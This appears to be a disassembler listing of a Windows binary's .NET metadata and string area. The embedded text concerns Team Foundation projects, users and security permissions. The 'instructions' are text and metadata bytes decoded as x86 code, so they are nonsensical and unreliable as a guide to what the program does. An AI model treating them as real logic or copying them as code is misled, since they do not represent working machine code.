  407a6e:	jae    0x407ae3
  407a70:	cmp    ah,BYTE PTR [eax]
  407a72:	add    DWORD PTR [edi],edx
  407a74:	dec    ebp
  407a75:	gs ins DWORD PTR es:[edi],dx
  407a77:	bound  esp,QWORD PTR [ebp+0x72]
  407a7a:	and    BYTE PTR [edi+0x66],ch
  407a7d:	and    BYTE PTR [ebx+0x30],bh
  407a80:	jge    0x407aa2
  407a82:	addr16 jb 0x407af4
  407a85:	jne    0x407af7
  407a87:	sub    BYTE PTR [ebx+0x29],dh
  407a8a:	cmp    al,BYTE PTR [ecx]
  407a8c:	push   cs
  407a8d:	jnp    0x407abf
  407a8f:	jge    0x407ab1
  407a91:	ins    DWORD PTR es:[edi],dx
  407a92:	gs ins DWORD PTR es:[edi],dx
  407a94:	bound  esp,QWORD PTR [ebp+0x72]
  407a97:	sub    BYTE PTR [ebx+0x29],dh
  407a9a:	cmp    al,BYTE PTR [ecx]
  407a9c:	push   ss
  407a9d:	dec    esi
  407a9e:	outs   dx,DWORD PTR ds:[esi]
  407a9f:	and    BYTE PTR [ebx+0x6f],ah
  407aa2:	ins    DWORD PTR es:[edi],dx
  407aa3:	ins    DWORD PTR es:[edi],dx
  407aa4:	popa   
  407aa5:	outs   dx,BYTE PTR ds:[esi]
  407aa6:	and    BYTE PTR fs:[edi+ebp*2+0x20],dh
  407aab:	gs js  0x407b13
  407aae:	arpl   WORD PTR [ebp+0x74],si
  407ab1:	gs add DWORD PTR cs:[eax+0x540a0d03],esi
  407ab9:	inc    esi
  407aba:	xor    eax,0x35343036
  407abf:	cmp    ah,BYTE PTR [eax]
  407ac1:	push   esp
  407ac2:	push   0x72672065
  407ac7:	outs   dx,DWORD PTR ds:[esi]
  407ac8:	jne    0x407b3a
  407aca:	sub    al,0x20
  407acc:	jnp    0x407afe
  407ace:	jge    0x407afc
  407ad0:	and    BYTE PTR [edx+0x65],dh
  407ad3:	jae    0x407b44
  407ad5:	ins    BYTE PTR es:[edi],dx
  407ad6:	jbe    0x407b3d
  407ad8:	and    BYTE PTR fs:[ecx+0x73],ah
  407adc:	and    BYTE PTR [ecx+0x20],ah
  407adf:	push   edi
  407ae0:	imul   ebp,DWORD PTR [esi+0x64],0x2073776f
  407ae7:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x79746974
  407aef:	and    BYTE PTR cs:[ecx+0x66],cl
  407af3:	and    BYTE PTR [ecx+0x6e],ah
  407af6:	and    BYTE PTR [ecx+0x70],ah
  407af9:	jo     0x407b67
  407afb:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  407b02:	and    BYTE PTR [edi+0x72],ah
  407b05:	outs   dx,DWORD PTR ds:[esi]
  407b06:	jne    0x407b78
  407b08:	and    BYTE PTR [edi+0x69],dh
  407b0b:	je     0x407b75
  407b0d:	and    BYTE PTR [eax+ebp*2+0x65],dh
  407b11:	and    BYTE PTR [ebx+0x61],dh
  407b14:	ins    DWORD PTR es:[edi],dx
  407b15:	and    BYTE PTR gs:[esi+0x61],ch
  407b19:	ins    DWORD PTR es:[edi],dx
  407b1a:	and    BYTE PTR gs:[ebp+0x78],ah
  407b1e:	imul   esi,DWORD PTR [ebx+0x74],0x6e6f2073
  407b25:	and    BYTE PTR [eax+ebp*2+0x65],dh
  407b29:	and    BYTE PTR [ebx+0x65],dh
  407b2c:	jb     0x407ba4
  407b2e:	gs jb  0x407b5d
  407b31:	and    BYTE PTR [ecx+0x6f],bh
  407b34:	jne    0x407b56
  407b36:	ins    DWORD PTR es:[edi],dx
  407b37:	jne    0x407bac
  407b39:	je     0x407b5b
  407b3b:	jae    0x407bad
  407b3d:	arpl   WORD PTR gs:[ecx+0x66],bp
  407b41:	jns    0x407b63
  407b43:	popa   
  407b44:	and    BYTE PTR [edi],ah
  407b46:	outs   dx,DWORD PTR fs:[esi]
  407b48:	ins    DWORD PTR es:[edi],dx
  407b49:	popa   
  407b4a:	imul   ebp,DWORD PTR [esi+0x27],0x61687420
  407b51:	je     0x407b73
  407b53:	imul   esi,DWORD PTR [ebx+0x20],0x68746965
  407b5a:	gs jb  0x407b7d
  407b5d:	daa    
  407b5e:	pop    ebx
  407b5f:	jnp    0x407b92
  407b61:	jge    0x407bc0
  407b63:	daa    
  407b64:	sub    al,0x20
  407b66:	je     0x407bd0
  407b68:	and    BYTE PTR gs:[eax+0x72],dh
  407b6c:	outs   dx,DWORD PTR ds:[esi]
  407b6d:	push   0x65
  407b6f:	arpl   WORD PTR [eax+eiz*1+0x55],si
  407b73:	push   edx
  407b74:	dec    ecx
  407b75:	sub    al,0x20
  407b77:	outs   dx,DWORD PTR ds:[esi]
  407b78:	jb     0x407b9a
  407b7a:	je     0x407be4
  407b7c:	and    BYTE PTR gs:[eax+0x72],dh
  407b80:	outs   dx,DWORD PTR ds:[esi]
  407b81:	push   0x65
  407b83:	arpl   WORD PTR [eax+eiz*1+0x6e],si
  407b87:	popa   
  407b88:	ins    DWORD PTR es:[edi],dx
  407b89:	gs and BYTE PTR cs:[esi+0x6f],al
  407b8e:	jb     0x407bb0
  407b90:	gs js  0x407bf4
  407b93:	ins    DWORD PTR es:[edi],dx
  407b94:	jo     0x407c02
  407b96:	cmp    cl,BYTE PTR gs:0x200a0d0a
  407b9d:	and    BYTE PTR [eax],ah
  407b9f:	and    BYTE PTR [eax],ah
  407ba1:	and    BYTE PTR [eax],ah
  407ba3:	and    BYTE PTR [eax],ah
  407ba5:	and    BYTE PTR [esi+0x3a],ch
  407ba8:	and    bl,BYTE PTR [ebx+0x7b]
  407bab:	xor    DWORD PTR [ebp+0x5c],edi
  407bae:	pop    ebp
  407baf:	push   ebx
  407bb0:	gs jb  0x407c29
  407bb3:	imul   esp,DWORD PTR [ebx+0x65],0x63634120
  407bba:	outs   dx,DWORD PTR ds:[esi]
  407bbb:	jne    0x407c2b
  407bbd:	je     0x407c32
  407bbf:	and    cl,BYTE PTR ds:0x2020200a
  407bc5:	and    BYTE PTR [eax],ah
  407bc7:	and    BYTE PTR [eax],ah
  407bc9:	and    BYTE PTR [eax],ah
  407bcb:	and    BYTE PTR [esi+0x3a],ch
  407bce:	and    bl,BYTE PTR [ebx+0x54]
  407bd1:	gs popa 
  407bd3:	ins    DWORD PTR es:[edi],dx
  407bd4:	and    BYTE PTR [eax+0x72],dl
  407bd7:	outs   dx,DWORD PTR ds:[esi]
  407bd8:	push   0x65
  407bda:	arpl   WORD PTR [esp+ebx*2+0x5d],si
  407bde:	push   eax
  407bdf:	jb     0x407c50
  407be1:	push   0x65
  407be3:	arpl   WORD PTR [eax+eiz*1+0x41],si
  407be7:	fs ins DWORD PTR es:[edi],dx
  407be9:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  407bf0:	je     0x407c61
  407bf2:	jb     0x407c67
  407bf4:	and    cl,BYTE PTR ds:0x2020200a
  407bfa:	and    BYTE PTR [eax],ah
  407bfc:	and    BYTE PTR [eax],ah
  407bfe:	and    BYTE PTR [eax],ah
  407c00:	and    BYTE PTR [esi+0x3a],ch
  407c03:	and    bl,BYTE PTR [ebx+0x76]
  407c06:	jae    0x407c7c
  407c08:	data16 jae 0x407c45
  407c0b:	das    
  407c0c:	das    
  407c0d:	das    
  407c0e:	inc    ebx
  407c0f:	ins    BYTE PTR es:[edi],dx
  407c10:	popa   
  407c11:	jae    0x407c86
  407c13:	imul   esp,DWORD PTR [esi+0x69],0x69746163
  407c1a:	outs   dx,DWORD PTR ds:[esi]
  407c1b:	outs   dx,BYTE PTR ds:[esi]
  407c1c:	das    
  407c1d:	push   esp
  407c1e:	gs popa 
  407c20:	ins    DWORD PTR es:[edi],dx
  407c21:	push   eax
  407c22:	jb     0x407c93
  407c24:	push   0x65
  407c26:	arpl   WORD PTR [edi+ebp*1+0x30],si
  407c2a:	xor    BYTE PTR [ecx+0x31],ah
  407c2d:	xor    BYTE PTR [edx+esi*1+0x33],ah
  407c31:	sub    eax,0x35346437
  407c36:	sub    eax,0x39333434
  407c3b:	sub    eax,0x62313839
  407c40:	sub    eax,0x33623364
  407c45:	xor    BYTE PTR gs:[edx+0x30],ah
  407c49:	bound  esi,QWORD PTR [ecx]
  407c4b:	gs gs pop esp
  407c4e:	pop    ebp
  407c4f:	push   eax
  407c50:	jb     0x407cc1
  407c52:	push   0x65
  407c54:	arpl   WORD PTR [eax+eiz*1+0x41],si
  407c58:	fs ins DWORD PTR es:[edi],dx
  407c5a:	imul   ebp,DWORD PTR [esi+0x69],0x61727473
  407c61:	je     0x407cd2
  407c63:	jb     0x407cd8
  407c65:	and    al,BYTE PTR [ecx]
  407c67:	adc    eax,0x20202020
  407c6c:	and    BYTE PTR [eax],ah
  407c6e:	cmp    al,0x6e
  407c70:	jne    0x407cde
  407c72:	ins    BYTE PTR es:[edi],dx
  407c73:	and    BYTE PTR [ecx+0x64],ch
  407c76:	outs   dx,BYTE PTR gs:[esi]
  407c78:	je     0x407ce3
  407c7a:	je     0x407cf5
  407c7c:	add    DWORD PTR ds:[edi],ecx
  407c7f:	push   eax
  407c80:	jb     0x407cf1
  407c82:	push   0x65
  407c84:	arpl   WORD PTR [eax+eiz*1+0x73],si
  407c88:	arpl   WORD PTR [edi+0x70],bp
  407c8b:	cmp    ah,BYTE PTR gs:[eax]
  407c8e:	add    DWORD PTR [edx+0x51],edx
  407c91:	jne    0x407cf4
  407c93:	ins    BYTE PTR es:[edi],dx
  407c94:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x75737361
  407c9c:	jb     0x407cff
  407c9e:	outs   dx,BYTE PTR ds:[esi]
  407c9f:	arpl   WORD PTR [ebp+0x20],sp
  407ca2:	popa   
  407ca3:	jne    0x407d19
  407ca5:	outs   dx,DWORD PTR ds:[esi]
  407ca6:	ins    DWORD PTR es:[edi],dx
  407ca7:	popa   
  407ca8:	je     0x407d13
  407caa:	outs   dx,DWORD PTR ds:[esi]
  407cab:	outs   dx,BYTE PTR ds:[esi]
  407cac:	and    BYTE PTR [ebp+0x6f],ch
  407caf:	fs and BYTE PTR gs:[ecx+0x73],ch
  407cb4:	and    BYTE PTR [ebp+0x6e],ah
  407cb7:	popa   
  407cb8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  407cbc:	and    BYTE PTR cs:[esi+0x6f],dl
  407cc0:	ins    BYTE PTR es:[edi],dx
  407cc1:	popa   
  407cc2:	je     0x407d2d
  407cc4:	ins    BYTE PTR es:[edi],dx
  407cc5:	and    BYTE PTR gs:[ecx+0x6e],ch
  407cc9:	outs   dx,WORD PTR ds:[esi]
  407ccb:	jb     0x407d3a
  407ccd:	popa   
  407cce:	je     0x407d39
  407cd0:	outs   dx,DWORD PTR ds:[esi]
  407cd1:	outs   dx,BYTE PTR ds:[esi]
  407cd2:	and    BYTE PTR [edi+0x69],dh
  407cd5:	ins    BYTE PTR es:[edi],dx
  407cd6:	ins    BYTE PTR es:[edi],dx
  407cd7:	and    BYTE PTR [edx+0x65],ah
  407cda:	and    BYTE PTR [eax+0x69],ch
  407cdd:	fs fs outs dx,BYTE PTR gs:[esi]
  407ce1:	add    DWORD PTR cs:[edx+edx*2],esp
  407ce5:	gs ins DWORD PTR es:[edi],dx
  407ce7:	outs   dx,DWORD PTR ds:[esi]
  407ce8:	jbe    0x407d53
  407cea:	outs   dx,BYTE PTR ds:[esi]
  407ceb:	and    BYTE PTR [si+0x68],dh
  407cef:	and    BYTE PTR gs:[ecx+0x63],ah
  407cf3:	arpl   WORD PTR [ebp+0x73],sp
  407cf6:	jae    0x407d18
  407cf8:	arpl   WORD PTR [edi+0x6e],bp
  407cfb:	je     0x407d6f
  407cfd:	outs   dx,DWORD PTR ds:[esi]
  407cfe:	ins    BYTE PTR es:[edi],dx
  407cff:	and    BYTE PTR [ebp+0x6e],ah
  407d02:	je     0x407d76
  407d04:	jns    0x407d34
  407d06:	cs add DWORD PTR cs:[eax],ebx
  407d0a:	push   edx
  407d0b:	gs ins DWORD PTR es:[edi],dx
  407d0d:	outs   dx,DWORD PTR ds:[esi]
  407d0e:	jbe    0x407d79
  407d10:	outs   dx,BYTE PTR ds:[esi]
  407d11:	and    BYTE PTR [bp+di+0x30],bh
  407d15:	jge    0x407d37
  407d17:	data16 jb 0x407d89
  407d1a:	ins    DWORD PTR es:[edi],dx
  407d1b:	and    BYTE PTR [ebx+0x31],bh
  407d1e:	jge    0x407d4e
  407d20:	cs add DWORD PTR cs:[ecx],esp
  407d24:	push   edx
  407d25:	outs   dx,BYTE PTR gs:[esi]
  407d27:	popa   
  407d28:	ins    DWORD PTR es:[edi],dx
  407d29:	imul   ebp,DWORD PTR [esi+0x67],0x65687420
  407d30:	and    BYTE PTR [ecx+0x70],ah
  407d33:	jo     0x407da1
  407d35:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  407d3c:	and    BYTE PTR [edi+0x72],ah
  407d3f:	outs   dx,DWORD PTR ds:[esi]
  407d40:	jne    0x407db2
  407d42:	cs cs add DWORD PTR cs:[ebx],ebx
  407d47:	push   edx
  407d48:	gs jae 0x407dba
  407d4b:	ins    BYTE PTR es:[edi],dx
  407d4c:	jbe    0x407db7
  407d4e:	outs   dx,BYTE PTR ds:[esi]
  407d4f:	and    BYTE PTR [bx+di+0x64],ch
  407d53:	outs   dx,BYTE PTR gs:[esi]
  407d55:	je     0x407dc0
  407d57:	je     0x407dd2
  407d59:	and    BYTE PTR [edx],ah
  407d5b:	jnp    0x407d8d
  407d5d:	jge    0x407d81
  407d5f:	cs cs add DWORD PTR cs:[esi],esi
  407d64:	push   edx
  407d65:	gs je  0x407dda
  407d68:	imul   esp,DWORD PTR [ebp+0x76],0x20676e69
  407d6f:	je     0x407dd9
  407d71:	and    BYTE PTR gs:[ecx+0x63],ah
  407d75:	arpl   WORD PTR [ebp+0x73],sp
  407d78:	jae    0x407d9a
  407d7a:	arpl   WORD PTR [edi+0x6e],bp
  407d7d:	je     0x407df1
  407d7f:	outs   dx,DWORD PTR ds:[esi]
  407d80:	ins    BYTE PTR es:[edi],dx
  407d81:	and    BYTE PTR [ecx+ebp*2+0x73],ch
  407d85:	je     0x407da7
  407d87:	outs   dx,WORD PTR ds:[esi]
  407d89:	jb     0x407dab
  407d8b:	outs   dx,DWORD PTR ds:[esi]
  407d8c:	bound  ebp,QWORD PTR [edx+0x65]
  407d8f:	arpl   WORD PTR [eax+eiz*1+0x22],si
  407d93:	jnp    0x407dc5
  407d95:	jge    0x407db9
  407d97:	cs cs add DWORD PTR cs:[edi+0x52],eax
  407d9d:	gs je  0x407e12
  407da0:	imul   esp,DWORD PTR [ebp+0x76],0x20676e69
  407da7:	je     0x407e11
  407da9:	and    BYTE PTR gs:[ecx+ebp*2+0x73],ch
  407dae:	je     0x407dd0
  407db0:	outs   dx,DWORD PTR ds:[esi]
  407db1:	data16 and BYTE PTR [ecx+0x70],ah
  407db5:	jo     0x407e23
  407db7:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  407dbe:	and    BYTE PTR [edi+0x72],ah
  407dc1:	outs   dx,DWORD PTR ds:[esi]
  407dc2:	jne    0x407e34
  407dc4:	jae    0x407de6
  407dc6:	ja     0x407e31
  407dc8:	je     0x407e32
  407dca:	imul   ebp,DWORD PTR [esi+0x20],0x20656874
  407dd1:	jae    0x407e43
  407dd3:	arpl   WORD PTR gs:[ecx+0x66],bp
  407dd7:	imul   esp,DWORD PTR [ebp+0x64],0x6f637320
  407dde:	jo     0x407e45
  407de0:	cs cs add DWORD PTR cs:[edx],ebp
  407de5:	push   esp
  407de6:	push   0x65732065
  407deb:	arpl   WORD PTR [ebp+0x72],si
  407dee:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x656d616e
  407df6:	jae    0x407e68
  407df8:	popa   
  407df9:	arpl   WORD PTR [ebp+0x20],sp
  407dfc:	jnp    0x407e2e
  407dfe:	jge    0x407e20
  407e00:	outs   dx,DWORD PTR fs:[esi]
  407e02:	gs jae 0x407e25
  407e05:	outs   dx,BYTE PTR ds:[esi]
  407e06:	outs   dx,DWORD PTR ds:[esi]
  407e07:	je     0x407e29
  407e09:	gs js  0x407e75
  407e0c:	jae    0x407e82
  407e0e:	add    DWORD PTR cs:[edx+0x54],eax
  407e12:	push   0x6f662065
  407e17:	ins    BYTE PTR es:[edi],dx
  407e18:	ins    BYTE PTR es:[edi],dx
  407e19:	outs   dx,DWORD PTR ds:[esi]
  407e1a:	ja     0x407e85
  407e1c:	outs   dx,BYTE PTR ds:[esi]
  407e1d:	and    BYTE PTR [bx+di+0x63],ah
  407e21:	je     0x407e8c
  407e23:	outs   dx,DWORD PTR ds:[esi]
  407e24:	outs   dx,BYTE PTR ds:[esi]
  407e25:	jae    0x407e47
  407e27:	popa   
  407e28:	jb     0x407e8f
  407e2a:	and    BYTE PTR [ecx+0x76],ah
  407e2d:	popa   
  407e2e:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x6920656c
  407e36:	outs   dx,BYTE PTR ds:[esi]
  407e37:	and    BYTE PTR [eax+ebp*2+0x65],dh
  407e3b:	and    BYTE PTR [ebx+0x65],dh
  407e3e:	arpl   WORD PTR [ebp+0x72],si
  407e41:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x656d616e
  407e49:	jae    0x407ebb
  407e4b:	popa   
  407e4c:	arpl   WORD PTR [ebp+0x20],sp
  407e4f:	jnp    0x407e81
  407e51:	jge    0x407e8d
  407e53:	add    DWORD PTR [eax+0x54],edx
  407e56:	push   0x6f662065
  407e5b:	ins    BYTE PTR es:[edi],dx
  407e5c:	ins    BYTE PTR es:[edi],dx
  407e5d:	outs   dx,DWORD PTR ds:[esi]
  407e5e:	ja     0x407ec9
  407e60:	outs   dx,BYTE PTR ds:[esi]
  407e61:	and    BYTE PTR [bp+di+0x65],dh
  407e65:	arpl   WORD PTR [ebp+0x72],si
  407e68:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x656d616e
  407e70:	jae    0x407ee2
  407e72:	popa   
  407e73:	arpl   WORD PTR [ebp+0x73],sp
  407e76:	and    BYTE PTR [ecx+0x72],ah
  407e79:	and    BYTE PTR gs:[ecx+0x76],ah
  407e7d:	popa   
  407e7e:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x7420656c
  407e86:	outs   dx,DWORD PTR ds:[esi]
  407e87:	and    BYTE PTR [eax+0x61],ch
  407e8a:	jbe    0x407ef1
  407e8c:	and    BYTE PTR [eax+0x65],dh
  407e8f:	jb     0x407efe
  407e91:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  407e98:	and    BYTE PTR [ebx+0x65],dh
  407e9b:	je     0x407ebd
  407e9d:	outs   dx,DWORD PTR ds:[esi]
  407e9e:	outs   dx,BYTE PTR ds:[esi]
  407e9f:	and    BYTE PTR [eax+ebp*2+0x65],dh
  407ea3:	ins    DWORD PTR es:[edi],dx
  407ea4:	cmp    al,BYTE PTR [ecx]
  407ea6:	xor    BYTE PTR [ecx],dh
  407ea8:	and    BYTE PTR [ebx+0x75],dh
  407eab:	jo     0x407f12
  407ead:	jb     0x407f15
  407eaf:	ins    BYTE PTR es:[edi],dx
  407eb0:	jne    0x407f21
  407eb2:	jne    0x407f27
  407eb4:	and    BYTE PTR [ebx+0x6f],ah
  407eb7:	ins    DWORD PTR es:[edi],dx
  407eb8:	ins    DWORD PTR es:[edi],dx
  407eb9:	popa   
  407eba:	outs   dx,BYTE PTR ds:[esi]
  407ebb:	fs sub eax,0x656e696c
  407ec1:	and    BYTE PTR [eax+0x61],dh
  407ec4:	jb     0x407f27
  407ec6:	ins    DWORD PTR es:[edi],dx
  407ec7:	gs je  0x407f2f
  407eca:	jb     0x407eec
  407ecc:	imul   esi,DWORD PTR [ebx+0x20],0x6f6e6769
  407ed3:	jb     0x407f3a
  407ed5:	fs add DWORD PTR cs:[ebx+edi*2],esi
  407eda:	xor    BYTE PTR [ebp+0x20],bh
  407edd:	jae    0x407f54
  407edf:	jo     0x407f46
  407ee1:	jb     0x407f49
  407ee3:	ins    BYTE PTR es:[edi],dx
  407ee4:	jne    0x407f55
  407ee6:	jne    0x407f5b
  407ee8:	and    BYTE PTR [ebx+0x6f],ah
  407eeb:	ins    DWORD PTR es:[edi],dx
  407eec:	ins    DWORD PTR es:[edi],dx
  407eed:	popa   
  407eee:	outs   dx,BYTE PTR ds:[esi]
  407eef:	fs sub eax,0x656e696c
  407ef5:	and    BYTE PTR [eax+0x61],dh
  407ef8:	jb     0x407f5b
  407efa:	ins    DWORD PTR es:[edi],dx
  407efb:	gs je  0x407f63
  407efe:	jb     0x407f73
  407f00:	and    BYTE PTR [ecx+0x72],ah
  407f03:	and    BYTE PTR gs:[ecx+0x67],ch
  407f07:	outs   dx,BYTE PTR ds:[esi]
  407f08:	outs   dx,DWORD PTR ds:[esi]
  407f09:	jb     0x407f70
  407f0b:	fs add DWORD PTR cs:[ecx],esi
  407f0f:	push   ebx
  407f10:	jne    0x407f82
  407f12:	gs jb  0x407f7b
  407f15:	ins    BYTE PTR es:[edi],dx
  407f16:	jne    0x407f87
  407f18:	jne    0x407f8d
  407f1a:	and    BYTE PTR [ebx+0x6f],ah
  407f1d:	ins    DWORD PTR es:[edi],dx
  407f1e:	ins    DWORD PTR es:[edi],dx
  407f1f:	popa   
  407f20:	outs   dx,BYTE PTR ds:[esi]
  407f21:	fs sub eax,0x656e696c
  407f27:	and    BYTE PTR [ebx+0x77],dh
  407f2a:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x20736920
  407f32:	imul   esp,DWORD PTR [edi+0x6e],0x6465726f
  407f39:	cmp    ah,BYTE PTR [eax]
  407f3b:	das    
  407f3c:	jnp    0x407f6e
  407f3e:	jge    0x407f6e
  407f40:	add    DWORD PTR [ebx+edx*2],esi
  407f43:	jne    0x407fb5
  407f45:	gs jb  0x407fae
  407f48:	ins    BYTE PTR es:[edi],dx
  407f49:	jne    0x407fba
  407f4b:	jne    0x407fc0
  407f4d:	and    BYTE PTR [ebx+0x6f],ah
  407f50:	ins    DWORD PTR es:[edi],dx
  407f51:	ins    DWORD PTR es:[edi],dx
  407f52:	popa   
  407f53:	outs   dx,BYTE PTR ds:[esi]
  407f54:	fs sub eax,0x656e696c
  407f5a:	and    BYTE PTR [ebx+0x77],dh
  407f5d:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x20736920
  407f65:	imul   esp,DWORD PTR [edi+0x6e],0x6465726f
  407f6c:	cmp    ah,BYTE PTR [eax]
  407f6e:	das    
  407f6f:	jnp    0x407fa1
  407f71:	jge    0x407fee
  407f73:	xor    DWORD PTR [ebp+0x2e],edi
  407f76:	add    DWORD PTR [ebx+edx*2],edi
  407f79:	jne    0x407feb
  407f7b:	gs jb  0x407fe4
  407f7e:	ins    BYTE PTR es:[edi],dx
  407f7f:	jne    0x407ff0
  407f81:	jne    0x407ff6
  407f83:	and    BYTE PTR [esi+eax*2+0x53],dl
  407f87:	push   ebx
  407f88:	inc    ebp
  407f89:	inc    ebx
  407f8a:	push   ebp
  407f8b:	push   edx
  407f8c:	dec    ecx
  407f8d:	push   esp
  407f8e:	pop    ecx
  407f8f:	pop    edi
  407f90:	push   ebx
  407f91:	push   edi
  407f92:	dec    ecx
  407f93:	push   esp
  407f94:	inc    ebx
  407f95:	dec    eax
  407f96:	inc    ebp
  407f97:	push   ebx
  407f98:	and    BYTE PTR [ebx+0x77],dh
  407f9b:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x20736920
  407fa3:	imul   esp,DWORD PTR [edi+0x6e],0x6465726f
  407faa:	cmp    ah,BYTE PTR [eax]
  407fac:	das    
  407fad:	jnp    0x407fdf
  407faf:	jge    0x40802c
  407fb1:	xor    DWORD PTR [ebp+0x2e],edi
  407fb4:	add    DWORD PTR [ecx],ebp
  407fb6:	push   esp
  407fb7:	push   0x61742065
  407fbc:	jb     0x408025
  407fbe:	gs je  0x407fe1
  407fc1:	push   esp
  407fc2:	gs popa 
  407fc4:	ins    DWORD PTR es:[edi],dx
  407fc5:	and    BYTE PTR [esi+0x6f],al
  407fc8:	jne    0x408038
  407fca:	fs popa 
  407fcc:	je     0x408037
  407fce:	outs   dx,DWORD PTR ds:[esi]
  407fcf:	outs   dx,BYTE PTR ds:[esi]
  407fd0:	and    BYTE PTR [ebx+0x65],dl
  407fd3:	jb     0x40804b
  407fd5:	gs jb  0x407ff8
  407fd8:	imul   esi,DWORD PTR [ebx+0x20],0x2e7d307b
  407fdf:	add    DWORD PTR [edi],eax
  407fe1:	push   ebp
  407fe2:	outs   dx,BYTE PTR ds:[esi]
  407fe3:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  407fe7:	outs   dx,BYTE PTR ds:[esi]
  407fe8:	add    DWORD PTR [ecx+0x4e],esp
  407feb:	outs   dx,DWORD PTR ds:[esi]
  407fec:	and    BYTE PTR [ebx+0x65],dh
  407fef:	arpl   WORD PTR [ebp+0x72],si
  407ff2:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x656d616e
  407ffa:	jae    0x40806c
  407ffc:	popa   
  407ffd:	arpl   WORD PTR [ebp+0x20],sp
  408000:	ins    DWORD PTR es:[edi],dx
  408001:	popa   
  408002:	je     0x408067
  408004:	push   0x7b207365
  408009:	xor    BYTE PTR [ebp+0x2e],bh
  40800c:	and    BYTE PTR [eax],ah
  40800e:	push   esp
  40800f:	data16 jae 0x408065
  408012:	arpl   WORD PTR gs:[ebp+0x72],si
  408016:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x6c6c6977
  40801e:	and    BYTE PTR [ecx+0x73],ah
  408021:	jae    0x408098
  408023:	ins    DWORD PTR es:[edi],dx
  408024:	and    BYTE PTR gs:[eax+ebp*2+0x61],dh
  408029:	je     0x40804b
  40802b:	jnp    0x40805d
  40802d:	jge    0x40804f
  40802f:	imul   esi,DWORD PTR [ebx+0x20],0x6e61656d
  408036:	je     0x408058
  408038:	je     0x4080a9
  40803a:	and    BYTE PTR [edx+0x65],ah
  40803d:	and    BYTE PTR [eax+ebp*2+0x65],dh
  408041:	and    BYTE PTR [edi+0x62],ch
  408044:	push   0x65
  408046:	arpl   WORD PTR [ecx+ecx*2+0x64],si
  40804a:	add    DWORD PTR cs:[esi+edx*2],ecx
  40804e:	gs jb  0x4080ba
  408051:	data16 jns 0x4080bd
  408054:	outs   dx,BYTE PTR ds:[esi]
  408055:	cs cs add DWORD PTR cs:[si],ecx
  40805b:	push   edi
  40805c:	inc    ecx
  40805d:	push   edx
  40805e:	dec    esi
  40805f:	dec    ecx
  408060:	dec    esi
  408061:	inc    edi
  408062:	cmp    ah,BYTE PTR [eax]
  408064:	jnp    0x408096
  408066:	jge    0x408069
  408068:	or     eax,0x646e6957
  40806d:	outs   dx,DWORD PTR ds:[esi]
  40806e:	ja     0x4080e3
  408070:	and    BYTE PTR [edi+0x72],ah
  408073:	outs   dx,DWORD PTR ds:[esi]
  408074:	jne    0x4080e6
  408076:	add    DWORD PTR [edi+edx*2],ecx
  408079:	imul   ebp,DWORD PTR [esi+0x64],0x2073776f
  408080:	jne    0x4080f5
  408082:	gs jb  0x4080c7
  408085:	push   ebx
  408086:	dec    edx
  408087:	inc    edx
  408088:	add    DWORD PTR [eax],eax
  40808a:	add    DWORD PTR [eax],eax
  40808c:	add    BYTE PTR [eax],al
  40808e:	add    BYTE PTR [eax],al
  408090:	or     al,0x0
  408092:	add    BYTE PTR [eax],al
  408094:	jbe    0x4080ca
  408096:	xor    BYTE PTR cs:[esi],ch
  408099:	xor    esi,DWORD PTR [eax]
  40809b:	xor    esi,DWORD PTR [ecx]
  40809d:	cmp    DWORD PTR [eax],eax
  40809f:	add    BYTE PTR [eax],al
  4080a1:	add    BYTE PTR ds:0x6c00,al
  4080a7:	add    BYTE PTR [edx+edx*1+0x0],dh
  4080ab:	add    BYTE PTR [ebx],ah
  4080ad:	jle    0x4080af
  4080af:	add    al,ah
  4080b1:	adc    al,BYTE PTR [eax]
  4080b3:	add    BYTE PTR [esi+ebx*1+0x0],ah
  4080b7:	add    BYTE PTR [ebx],ah
  4080b9:	push   ebx
  4080ba:	je     0x40812e
  4080bc:	imul   ebp,DWORD PTR [esi+0x67],0x73
  4080c3:	add    BYTE PTR [ecx+esi*1+0x0],al
  4080c7:	add    BYTE PTR [eax],ah
  4080c9:	or     eax,0x55230000
  4080ce:	push   ebx
  4080cf:	add    BYTE PTR [esi+edi*1+0x0],ah
  4080d3:	add    BYTE PTR [eax],dl
  4080d5:	add    BYTE PTR [eax],al
  4080d7:	add    BYTE PTR [ebx],ah
  4080d9:	inc    edi
  4080da:	push   ebp
  4080db:	dec    ecx
  4080dc:	inc    esp
  4080dd:	add    BYTE PTR [eax],al
  4080df:	add    BYTE PTR [esi+edi*1+0x0],dh
  4080e3:	add    BYTE PTR [ebx+ecx*1+0x42230000],bh
  4080ea:	ins    BYTE PTR es:[edi],dx
  4080eb:	outs   dx,DWORD PTR ds:[esi]
  4080ec:	bound  eax,QWORD PTR [eax]
  4080ee:	add    BYTE PTR [eax],al
  4080f0:	add    BYTE PTR [eax],al
  4080f2:	add    BYTE PTR [eax],al
  4080f4:	add    al,BYTE PTR [eax]
  4080f6:	add    BYTE PTR [ecx],al
  4080f8:	push   edi
  4080f9:	frstor [edx+0xb0929]
  4080ff:	add    BYTE PTR [eax],al
  408101:	cli    
  408102:	and    eax,0x160033
  408107:	add    BYTE PTR [ecx],al
  408109:	add    BYTE PTR [eax],al
  40810b:	add    BYTE PTR [eax+0x0],ah
  40810e:	add    BYTE PTR [eax],al
  408110:	add    eax,0xf000000
  408115:	add    BYTE PTR [eax],al
  408117:	add    BYTE PTR [ebp+0x0],bl
  40811a:	add    BYTE PTR [eax],al
  40811c:	and    al,0x0
  40811e:	add    BYTE PTR [eax],al
